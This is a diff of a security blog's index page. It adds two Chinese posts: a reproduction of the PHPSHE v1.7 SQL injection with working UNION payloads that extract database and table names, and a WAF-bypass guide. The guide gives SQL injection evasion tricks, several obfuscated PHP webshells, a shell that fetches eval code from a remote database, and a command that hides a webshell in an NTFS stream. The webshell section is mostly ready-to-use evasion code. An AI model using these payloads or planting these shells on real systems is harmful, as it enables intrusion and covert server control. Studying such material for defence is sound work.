@@ -160,6 +160,193 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-PHPSHECMS v1.7SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/16/PHPSHECMS%20v1.7SQL%E6%B3%A8%E5%85%A5/">PHPSHE v1.7-SQL注入复现</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/16/PHPSHECMS%20v1.7SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2020-04-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;针对PHPSHE v1.7 CMS支付接口存在的SQL注入漏洞(CVE-2019-9762)进行复现。<br><strong>0x01环境</strong><br>&emsp;&emsp;phpStudy php5.2+mysql+apache<br>&emsp;&emsp;PHPSHE v1.7 源码<br>&emsp;&emsp;代码审计工具（Seay源代码审计系统）<br><strong>0x02过程</strong><br>&emsp;&emsp;找到漏洞存在位置phpshe1.7/include/plugin/payment/alipay/pay.php。<br>pay.php包含了公共文件common.php。先对comom.php进行分析。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;出现了3个函数<code>extract</code>、<code>pe_trim</code>以及<code>pe_stripslashes</code>分别进行函数查询和追踪。<br>&emsp;&emsp;<code>extract(array,extract_rules,prefix)</code>：从数组中将变量导入到当前的符号表。第二个参数为指定变量存在冲突时的规则，第三个参数为指定变量名前缀。<br>&emsp;&emsp;<code>pe_trim</code>：自定义函数，移除字符串左右空格。<br>&emsp;&emsp;<code>pe_stripslashes</code>：自定义函数，移除反斜杠。<br>这段代码是是为注册的GPC以及SESSION变量加上指定前缀。<br>在<code>pay.php</code>中，注入相关代码为<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%872.png" alt=""><br>有3个自定义函数<code>pe_dbhold</code>、<code>pe_select</code>、<code>order_table</code><br>分别进行分析<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;<code>pe_dbhold()</code>会对字符串或者数组调用<code>addslashes()</code>转义，<code>addslashes()</code>函数返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串。<br>&emsp;&emsp;参数经过<code>pe_dbhold</code>函数处理后赋值给变量<code>$order_id</code>，变量<code>$order_id</code>会首先被<code>order_table</code>函数处理，再带入到<code>pe_slelect</code>函数中。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;而<code>order_table()</code>函数的作用是如果传入参数包含下划线，则返回<code>order_</code>和参数下划线之前的部分拼接字符串，如果不包含下划线则直接返回<code>order</code>。<br>&emsp;&emsp;<code>stripos(string，find)</code>函数查找字符串find在另一字符串string中第一次出现的位置（不区分大小写）。<br>&emsp;&emsp;<code>explode(separator,string)</code>函数把字符串string以字符串separator分割为数组。<br>得出结论：这里函数的返回值可控。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;再跟进到<code>pe_select</code>函数，<code>order_table()</code>函数的返回值<code>$table</code>是作为表名拼接到SQL语句，<code>$where</code>以参数值<code>array(&#39;order_id&#39;=&gt;$order_id)</code>传入函数，会<code>dowhere</code>方法处理。<br>跟进<code>_dowhere</code>方法<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;其作用是返回一条<code>where `order_id` = &#39;参数数组的值&#39;</code>的查询条件语句。<br><code>str_ireplace(find,replace,string)</code>函数替换字符串string中的一些字符find（不区分大小写）为字符串replace。<br><strong>过程整理：</strong><br>&emsp;&emsp;当我们正常操作时，在充值界面输入任意金额提交，用Burpsuite抓包，放掉第一个包，在第二个数据包中会生成一个如<code>id=pay_200409155427079</code>这样的参数值，传入代码，参数值经<code>pe_dbhold</code>处理后赋值给<code>$order_id</code>，即<code>$order_id=pay_200409155427079</code>，<code>$order_id</code>经过<code>order_table()</code>函数处理返回取出下划线前面的字符串与<code>order_</code>拼接成<code>order_pay</code>作为表名传入到<code>pe_select</code>函数，同时<code>array(&#39;order_id&#39;=&gt;$order_id)</code>即<code>array(&#39;order_id&#39;=&gt;&#39;pay_200409155427079&#39;)</code>作为<code>$where</code>参数传入到<code>pe_select</code>函数，而在<code>pe_select</code>函数中，<code>_dowhere</code>方法对<code>$where</code>进行了处理，返回一个查询条件语句<code>where `order_id`=&#39;pay_200409155427079&#39;</code>并赋值给<code>$sqlwhere</code>，结合代码，最后<code>pe_selec函数</code>返回一条查询语句<br><code>select * from `pe_order_pay` where `order_id` = &#39;pay_200409155427079&#39;</code><br>并将查询结果赋值为<code>$order</code>。<br>&emsp;&emsp;在整个过程当中，有两个关键点，一个是下划线，另外一个是参数值会作为表名传入到查询语句中。<br>利用这两点，可以构造(由数据库知表<code>pe_order_pay</code>有12个字段)<br>&emsp;&emsp;<code>payload{pay`where%201=2%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12%23_}</code><br>最终的查询语句为<br>&emsp;&emsp;<code>select * from `pe_order_pay`where 1=2 union select 
+1,2,3,4,5,6,7,8,9,10,11,12#` where `order_id` = &#39;pay`where 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12#_&#39; limit 1</code><br><code>%23(#注释符)</code>后面的内容都被注释掉<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%877.png" alt=""><br>确认回显点在3，接着把payload中的3改成<code>database()</code>，即可查出数据库库名。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%878.png" alt=""><br><strong>成功复现SQL注入漏洞。</strong></p>
+<p>—————————-分割线—————————-</p>
+<p><strong>延伸：</strong><br>&emsp;&emsp;在数据库中发现，所有的表名及字段名都存在下划线，如果要查询表名或者字段名，必然在回显点3这个位置处出现下划线，一旦出现下划线，上文的payload逻辑就会失效，需要重新构造payload。<br>这里，提供两种思路。<br><strong>思路一：</strong><br>&emsp;&emsp;仅可以查出没有下划线的表名、字段名。通过MySQL的exists函数。上述payload当where后的条件为flase时，就可以查询出库名。<br>&emsp;&emsp;那么可以构造<br>&emsp;&emsp;<code>payload{pay`where%20not%20exits(select*from%20表名)
+%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12%23_}</code><br>&emsp;&emsp;如果响应内容出现数据库名，说明此表存在。可以使用Burpsuite爆破模块。<br>&emsp;&emsp;查出表名后，只需将上述payload中的<code>*</code>改成字段名，同理爆破即可。<br><strong>思路二：</strong><br>&emsp;&emsp;不限下划线的数据，第一个下划线前的内容会作为表名，而参数值会被单引号闭合在SQL语句的<code>order_id</code>中，那么是否能够构造注释来个前后呼应实现绕过，可以想到MySQL的闭合注释符<code>/**/</code>，结合下划线的限制，那么在第一个下划线前后加上注释符号<code>/**/</code>即在payload中添加<code>/*_*/</code>，由于回显位会出现下划线，所以<code>/*_*/</code>必须加在回显位之前。<br>&emsp;&emsp;即构造payload<br><code>{pay`where%201=2%20union%20select%201,2,/*_*/group_concat(table_name),4,5,6,7,8,9,10,11,12%20from%20information_schema.tables%20where%20table_schema=database()%23}</code><br>&emsp;&emsp;此payload在数据库查询的语句为<br>&emsp;&emsp;<code>select * from `pe_order_pay`where 1=2 union select 1,2,/*` where `order_id` = &#39;pay`where 1=2 union select 1,2,/*_*/group_concat(table_name),4,5,6,7,8,9,10,11,12 from information_schema.tables where table_schema=database()#&#39; limit 1</code><br>&emsp;&emsp;通过注释符，成功绕过代码的限制<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%879.png" alt=""><br><strong>0x03总结</strong><br>&emsp;&emsp;此SQL注入漏洞主要是由于SQL查询语句中的表名为用户可控加上没有在相关函数中对其传参进行限制导致。<br>复现过程由于已知漏洞位置，复现难度不高。通过代码审计的方式了解漏洞的相关代码，构造payload注入查出库名并不难。<br>收获：</p>
+<ol>
+<li>SQL注入存在于接口中。</li>
+<li>有针对性的代码审计是一个不断溯源的过程。</li>
+<li>通过添加输出函数输出变量的方式可以更好的对代码进行分析。</li>
+<li>熟悉了一些函数。(如<code>addslashes</code>、<code>stripos</code>、<code>explode</code>、<code>str_ireplace</code>、<code>implode</code>、<code>trim</code>)</li>
+</ol>
+<p><br><br><br><br><font face="Georgia" color=#c4444>复现而知新。</font></p>
+<p>作者：WebDogC</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">复现、PHPSHE</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/16/PHPSHECMS%20v1.7SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-绕WAF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/16/%E7%BB%95WAF/">绕WAF</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/16/%E7%BB%95WAF/" class="archive-article-date">
+  	<time datetime="2020-04-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>&emsp;&emsp;WAF是Web应用防护系统(Web Application Firewall)的简称，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>&emsp;&emsp;WAF分硬件类型WAF和软件类型WAF，由于硬件WAF的价格有点昂贵所以软件WAF更普遍存在，基本上是政府站点、国网、运营商等国企才会大规模装配。<br>&emsp;&emsp;常见的软WAF：安全狗、云锁、悬镜、护卫神、云盾。<br>&emsp;&emsp;实际上，WAF检测机制的核心以正则匹配居多。而安全和客户体验都是需要平衡的，考虑到用户的体验性，所以WAF的拦截会很谨慎。</p>
+<h3 id="绕WAF之SQL注入"><a href="#绕WAF之SQL注入" class="headerlink" title="绕WAF之SQL注入"></a>绕WAF之SQL注入</h3><p>1.值替换绕过，用字符串、负数、十六进制、符号运算甚至是逻辑运算符(需考虑到不同符号在不同地方有不同的含义)来构造payload替换简单的<code>and 1=1</code>/<code>or 1=2</code>。<br>2.内联注释<br>&emsp;&emsp;MySQL为了保持与其他数据库兼容，将MySQL中特有的语句放在<code>/!...*/</code>中，<code>!与*</code>之间的代码在不兼容的数据库中不执行，而在MySQL自身却能够被识别，执行。<br>&emsp;&emsp;内联注释被拦截还可以尝试加入一个版本号，例如<code>/*!50001 代码语句*/</code>表示数据库版本&gt;=5.00.01时代码语句才能被执行。可以利用Burpsuite爆破来测试WAF不拦截的版本号。<br>3.大小写绕过、双写绕过，对payload中的关键字进行大小写混合、双写来绕过。<br>4.函数替换绕过，用同等作用的冷门函数替换常见函数。<br>5.特殊字符绕过(换行<code>%0a</code>、反引号)<br>&emsp;&emsp;例如，<code>union /*!select*/ 1,2,3 -- qwe/*%0a from admin %23*/</code>就能成功绕过WAF对<code>from</code>的拦截,这里利用的是<code>--</code>与<code>/**/</code>都是单行注释以及换行符<code>%0a</code>的构造实现绕过。<br>&emsp;&emsp;某些函数在前面在上一个反引号，函数能够被执行，例如<code>sleep</code>、<code>updatexml</code>。<br>6.编码绕过，利用多次解码，构造编码来实现绕过。<br>7.等价替换，利用其它冷门函数来代替寻常注入的函数。例如<code>union&lt;=&gt;union all</code>。<br>8.容器特性，利用Web容器的解析来实现绕过，例如IIS的%分割(例如<code>s%e%l%e%c%t&lt;=&gt;select</code>)、Apache的HPP参数污染(以最后的传参为准)。<br>9.白名单绕过,有时以管理员权限或者以本地ip127.0.0.1访问则能够绕过拦截，例如可以利用<code>X-Forwarded-For: 127.0.0.1</code>。<br>10.数据填充绕过，当输入的数据太多，超过了WAF检测的范围时，由于WAF不能随意拦截数据，则可以用注释大量无用字符填充payload实现绕过。GET传参的长度为256个字符长度，无法以此方式绕过，可利用POST传参。</p>
+<p>————————分割线————————</p>
+<h3 id="绕WAF之GetWebShell"><a href="#绕WAF之GetWebShell" class="headerlink" title="绕WAF之GetWebShell"></a>绕WAF之GetWebShell</h3><p>1.end函数绕过<br>    &emsp;&emsp;end函数：输出数组中最后一个元素的值。<br>    &emsp;&emsp;<code>&lt;?php eval(end($_REQUEST));?&gt;</code><br>2.通过常量定义绕过<br>    &emsp;&emsp;将传参定义为一个变量，然后使用代码执行函数eval执行变量的值。<br>    &emsp;&emsp;<code>&lt;?php define(&quot;a&quot;,&quot;$_REQUEST[a]&quot;);eval(a);</code><br>3.通过构造字符串拼接 + 变量覆盖绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>	$a=<span class="hljs-string">'ass'</span>;  <br>	$b=<span class="hljs-string">'ert'</span>;<br>	$funcName=$a.$b;<br>	$x=<span class="hljs-string">'funcName'</span>;<br>	$$x($_REQUEST[a]); <span class="hljs-comment">//assert($_REQUEST[a]);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>4.通过定义函数绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">($a)</span></span>&#123;<br>	<span class="hljs-keyword">return</span> $a;&#125;<br>	<span class="hljs-keyword">eval</span>(a($_REQUEST)[a]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>5.通过定义类绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><br></span>&#123;<br>  <span class="hljs-keyword">public</span> $name = <span class="hljs-string">''</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">"$this-&gt;name"</span>);<br>  &#125;<br>&#125;<br>	$user = <span class="hljs-keyword">new</span> User;<br>	$user-&gt;name = <span class="hljs-string">''</span>.$_REQUEST[<span class="hljs-number">1</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>6.其他方式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># First 构造Cookie传参</span><br><span class="hljs-meta">&lt;?php</span><br>    $COOKIE = $_COOKIE;<br>    <span class="hljs-keyword">foreach</span>($COOKIE <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;<br>        <span class="hljs-keyword">if</span>($key==<span class="hljs-string">'assert'</span>)&#123;<br>            $key($_POST[<span class="hljs-string">'a'</span>];)<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Second 利用函数集合</span><br><span class="hljs-meta">&lt;?php</span><br>	$a=get_defined_functions(); <span class="hljs-comment">//返回PHP所支持的函数</span><br>	$a[<span class="hljs-string">'internal'</span>][<span class="hljs-number">841</span>]($_GET[<span class="hljs-string">'a'</span>]);<span class="hljs-comment">//841为数组中assert函数对应的键值</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Third 利用数据库</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(mysqli_fetch_assoc(mysqli_query(mysqli_connect(<span class="hljs-string">'公127.0.0.1'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'maoshe'</span>),<span class="hljs-string">'select * from info'</span>))[<span class="hljs-string">'info'</span>]); <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># 此php文件的意思是，执行SQL连接语句，而这条SQL语句会去连接远程数据库，并且取出info表里的info字段的一条记录值。</span><br><span class="hljs-comment"># 创建一个可连接到的公网服务器数据库，并构造一张info表，添加一个内容为eval($_REQUEST[a])的info字段值。</span><br><span class="hljs-comment"># 利用上传php文件内无危险内容绕过WAF。</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p>a Tip：<br>在Windows中可以利用ntfs文件流隐藏WebShell<br>1.先在当前目录下添加一个隐藏的一句话木马<code>1.txt</code><br>&emsp;&emsp;命令行执行<code>echo &quot;&lt;?php eval($_REQUEST[a])?&gt;&quot; &gt;&gt; /:1.txt</code><br>2.写一个内容为<code>&lt;?php include(&#39;/:1.txt&#39;)?&gt;</code>php文件去包含隐藏的<code>1.txt</code><br>3.访问php文件带上传参，就是可以实现命令执行。<br>4.在php文件中可以构造一些if判断等代码来避免WAF的检测。</p>
+</blockquote>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>在绕WAF时，需要逐步排除然后确定被拦截的字符，对症下药。</li>
+<li>在GetWebShell绕过中，可以尝试添加if判断代码块来躲避检测。</li>
+<li>绕WAF考察是对语言的掌握度，平时可积累一些可替代当前使用函数偏冷门的函数。</li>
+</ol>
+<p><br /><br /><br /><br /></p>
+<blockquote>
+<p>见招拆招</p>
+</blockquote>
+<p>作者：WebDogC</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">绕WAF、WAF、security、Web安全、note</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/16/%E7%BB%95WAF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-OWASP TOP 10" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1120,318 +1307,6 @@
 
 
   
-    <article id="post-CSRF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/07/CSRF/">跨站请求伪造(CSRF)</a>
-    </h1>
-  
-
-        
-        <a href="/2020/03/07/CSRF/" class="archive-article-date">
-  	<time datetime="2020-03-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h2><p>&emsp;&emsp;<strong>跨站请求伪造</strong>，Cross-site request forgery，是一种常见的Web攻击，也是Web安全中最容易被忽视的一种攻击方式。</p>
-<p>&emsp;&emsp;<strong>危害</strong>：以你的名义，进行一些非你本意的操作(如转账、发消息、购买商品等等)，能够造成个人隐私泄露甚至是财产安全等问题。</p>
-<h2 id="CSRF的攻击"><a href="#CSRF的攻击" class="headerlink" title="CSRF的攻击"></a>CSRF的攻击</h2><h3 id="漏洞原理及攻击过程"><a href="#漏洞原理及攻击过程" class="headerlink" title="漏洞原理及攻击过程"></a>漏洞原理及攻击过程</h3><p><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CSRF.png" alt=""></p>
-<ol>
-<li>用户A打开浏览器,访问网站B,输入用户名和密码请求登录网站B。</li>
-<li>在用户A信息通过验证后,网站B在服务器端产生一个专属用户A的Cookie认证信息返回给浏览器,此后用户A的所有操作都会携带其本人的Cookie信息。</li>
-<li>在用户A的Cookie信息生效时,Hacker伪造了网站C(模拟网站B并携带恶意操作)。</li>
-<li>Hacker将伪造后的网站C，发送给用户A，诱使其点击。</li>
-<li>用户A在同一浏览器打开了Hacker发来的网站C,由于用户A在网站C的所有操作携带了其本人Cookie信息,执行网站C的操作(如转账)时,服务器会认为是用户A的本意操作,从而通过网站C的请求执行了Hacker预期的相关操作(如转账等)。</li>
-<li>实现网站C对网站B的恶意操作。</li>
-</ol>
-<p>&emsp;&emsp;<strong>实际上</strong>,网站C的操作并非用户A的本意操作,由于浏览器只认Cookie信息,所以这里Hacker成功地以用户A的名义在网站B进行了操作。</p>
-<p>&emsp;&emsp;<strong>攻击成功的原因</strong>：重要操作的所有参数都是可以被攻击者知道，从而构造虚假网页。</p>
-<h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><h3>CSRF漏洞检测</h3>
-
-<ul>
-<li>普遍方法:抓取一个正常请求的数据包,去掉Referer字段提交,若请求有效,则基本可以判断存在CSRF漏洞。</li>
-<li>检测工具:如CSRFTester,其原理为抓取数据包,修改相应信息,重新提交,这相当于一次伪造客户请求,模仿CSRF攻击,当然,此款工具也能用来进行CSRF攻击。</li>
-</ul>
-<h3>防御方法</h3>
-
-<ul>
-<li>验证码&emsp;验证码强制用户与应用进行交互能够很好的遏制CSRF。验证码被认为是对抗CSRF攻击最简洁有效的防御方法，但考虑到用户的体验，不能给所有的操作都加上验证码，所以其只能作为一个辅助手段。</li>
-<li>Referer Check&emsp;在互联网应用中，页面与页面之间具有一定的联系,Referer参数的值为跳转到当前页面的上一个页面URL(即页面来源)。服务器可以通过检查Referer参数是否合法来判断用户是否被CSRF攻击。</li>
-<li>Anti CSRF Token&emsp;只有当攻击者预测出URL的所有参数才能成功的伪造请求，增加一个随机产生CSRF Token参数，使得攻击者无法成功伪造。</li>
-</ul>
-<p><strong>CSRF Token</strong>:即user_token，这类型得随机参数被称为csrf token，它保证了攻击者无法猜到所有参数(需要结合XSS漏洞获取页面的token值)。</p>
-<h4>防御方法的缺陷</h4>
-
-<ul>
-<li>验证码&emsp;验证码会给用户带来不好的体验。</li>
-<li>Referer Check&emsp;若是伪造的网站携带可验证通过的Referer字段,还是能够通过此验证,进行CSRF攻击，除此之外，由于Referer会记录下用户的访问来源，存在客户认为隐私权被侵犯，而手动设置发送请求时不提供Referer字段。</li>
-<li>Anti CSRF Token&emsp;Token值需要足够随机，必须使用安全的随机数生成算法保证其安全性，另外，Hacker也可以登录网站或者通过Referer值获得token值得到这个参数，在参数的有效期内进行CSRF攻击。</li>
-</ul>
-<p><br/><br/><br/></p>
-<blockquote>
-<p><font face="Georgia" color=#c4444>安全需要不断地运营，持续的优化。</font></p>
-</blockquote>
-<br/>
-作者：WebDogC <br/>
-参考书籍《白帽子讲Web安全》 <br/>
-参考博客: https://blog.csdn.net/stpeace/article/details/53512283
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">CSRF、security、Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/03/07/CSRF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-XSS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/05/XSS/">跨站脚本攻击(XSS)</a>
-    </h1>
-  
-
-        
-        <a href="/2020/03/05/XSS/" class="archive-article-date">
-  	<time datetime="2020-03-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2>XSS简介</h2>
-
-<p>&emsp;&emsp;<strong>跨站脚本攻击</strong>，Cross site script,由于为了和层叠样式表(Cascading Style Sheet，CSS)有所区别，所以在安全领域中叫做“XSS”。<br>&emsp;&emsp;<strong>XSS攻击</strong>，通常是指黑客通过“HEML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。<br>&emsp;&emsp;XSS长期以来别列为客户端Web安全中的<strong>头号大敌</strong>。现在业内达成的共识是：针对各种不同场景产生的XSS，需要区分情景对待。</p>
-<blockquote>
-<p>在正确的地方做正确的事情。</p>
-</blockquote>
-<h4>XSS的分类</h4>
-
-<ul>
-<li>存储型XSS(Stored):攻击代码针对<strong>数据库</strong>，输出在所有相对应的<strong>HTTP响应</strong>中。</li>
-<li>反射型XSS(Reflected):恶意脚本在<strong>当前页面</strong>执行所形成的XSS。</li>
-<li>DOM型XSS:修改页面的<strong>DOM节点</strong>形成的XSS。(特殊的反射型XSS)</li>
-</ul>
-<h2>XSS攻击</h2>
-
-<p>&emsp;&emsp;XSS Payload：用以完成各种功能的恶意脚本，实际上就是JavaScript脚本，其可以实现任何JavaScript脚本能实现的功能。</p>
-<h4>XSS的攻击方式</h4>
-
-<ul>
-<li>构造GET、POST请求</li>
-<li>加载远程脚本</li>
-<li>XSS钓鱼</li>
-<li>识别用户浏览器</li>
-<li>识别用户安装的软件</li>
-<li>识别用户浏览历史</li>
-<li>获取用户的真实IP地址</li>
-<li>XSS Worm(蠕虫)攻击</li>
-</ul>
-<h4>XSS的攻击平台</h4>
-
-<p>&emsp;&emsp;为了使用方便，安全研究者将XSS Payload的许多功能封装起来，成为XSS攻击平台，即可以通过攻击平台更加方便地演示网站存在的XSS危害。</p>
-<h5>常见的XSS平台</h5>
-
-<ul>
-<li>Attack API</li>
-<li>BeEF</li>
-<li>XSS Proxy</li>
-</ul>
-<h4>XSS Payload构造技巧</h4>
-
-<ul>
-<li>利用页面字符编码</li>
-<li>绕过长度限制<ul>
-<li>利用location.hash“藏代码”</li>
-<li>利用注释符注释中间代码</li>
-<li>使用<base>标签劫持相对路径标签</li>
-<li>window.name与eval(name)相结合</li>
-<li>闭合标签</li>
-</ul>
-</li>
-<li>绕过标签限制<ul>
-<li>大小写混合</li>
-<li>标签嵌套</li>
-<li>夹杂注释 </li>
-</ul>
-</li>
-</ul>
-<h2>XSS防御</h2>
-
